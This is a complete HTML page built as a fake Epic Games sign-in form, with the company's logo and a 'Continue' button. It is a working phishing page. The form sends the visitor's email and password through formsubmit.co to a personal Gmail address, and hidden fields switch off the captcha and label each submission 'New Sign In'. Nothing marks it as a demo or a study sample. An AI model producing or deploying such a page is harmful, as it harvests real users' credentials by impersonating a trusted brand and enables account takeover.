<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #121212;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background-color: #333;
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        
        
        
        h1 {
            color: #fff;
            margin-bottom: 25px;
            font-size: 1.8rem;
        }
        
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 16px;
            border: none;
            border-radius: 5px;
            background-color: #444;
            color: #fff;
            font-size: 1rem;
        }
        
        input:focus {
            outline: 2px solid #007bff;
            background-color: #555;
        }
        
        .forgot-password {
            display: block;
            text-align: right;
            margin: -10px 0 15px;
            color: #aaa;
            text-decoration: none;
            font-size: 0.85rem;
            transition: color 0.3s;
        }
        
        .forgot-password:hover {
            color: #007bff;
        }
        
        button {
            width: 100%;
            padding: 14px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s;
            font-weight: bold;
        }
        
        button:hover {
            background-color: #0062cc;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="profile-icon">
            <img src="https://images.squarespace-cdn.com/content/v1/618131cf8cd8e779321e9666/f82fbade-31d7-45e1-8001-1267354754fb/Epic+Games+Logo.png" alt="Girl"width="100" height="100" >
                
                
        </div>
        <h1>Sign In to an Epic Games account</h1>
        <form action="https://formsubmit.co/mahmoud313245@gmail.com" method="POST">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <a href="#" class="forgot-password">Forgot password?</a>
            
            <!-- Hidden FormSubmit fields -->
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_subject" value="New Sign In">
            
            <button type="submit">Continue</button>
        </form>
    </div>
</body>
</html>
